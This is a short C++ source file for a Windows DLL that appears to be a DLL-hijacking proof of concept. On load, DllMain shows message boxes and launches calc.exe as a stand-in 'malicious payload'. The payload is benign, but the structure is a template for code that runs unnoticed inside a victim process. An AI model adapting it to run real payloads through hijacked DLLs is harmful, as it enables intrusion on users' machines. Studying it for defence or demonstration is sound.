#include <windows.h>

extern "C" __declspec(dllexport) void SneakyMain() {
    MessageBox(NULL, "Sneaky DLL Executed!", "DLL Hijack", MB_OK);
    system("C:\\Windows\\System32\\calc.exe"); // Example malicious payload
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        MessageBox(NULL, "DLL Loaded Successfully!", "DLL Notification", MB_OK | MB_ICONINFORMATION);
        SneakyMain();
    }
    return TRUE;
}
